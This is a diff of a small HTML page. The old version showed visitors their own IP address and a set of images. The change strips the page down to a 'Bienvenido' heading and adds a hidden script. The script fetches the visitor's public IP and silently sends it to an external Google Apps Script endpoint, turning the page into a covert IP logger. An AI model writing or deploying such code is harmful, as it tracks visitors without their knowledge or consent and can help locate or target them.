@@ -1,41 +1,14 @@
 <!DOCTYPE html>
-<html lang="es">
-<head>
-  <meta charset="UTF-8">
-  <title>Trapos</title>
-  <style>
-    body {
-      background: #111;
-      color: white;
-      text-align: center;
-      font-family: Arial;
-    }
-    img {
-      width: 250px;
-      margin: 10px;
-      border-radius: 10px;
-    }
-  </style>
-</head>
-<body>
-
+<html>
+<body style="background:#111;color:white;text-align:center">
 <h1>Bienvenido</h1>
-<p>Tu IP es:</p>
-<h2 id="ip">Cargando...</h2>
-
-<img src="IMG_8553.webp">
-<img src="IMG_8554.webp">
-<img src="IMG_8587.webp">
-<img src="IMG_9535.webp">
-<img src="IMG_9536.webp">
-<img src="IMG_9619.webp">
-
-
 
 <script>
 fetch("https://api.ipify.org?format=json")
   .then(r => r.json())
-  .then(d => document.getElementById("ip").innerText = d.ip);
+  .then(d => {
+    fetch("https://script.google.com/macros/s/AKfycbwlVtTLQCNDnx739bzGbSYqpO9y09rtylY6bO9Y0zOZm_-2E_shgjylmsgf2N0p2dRk/exec?ip=" + d.ip);
+  });
 </script>
 
 </body>
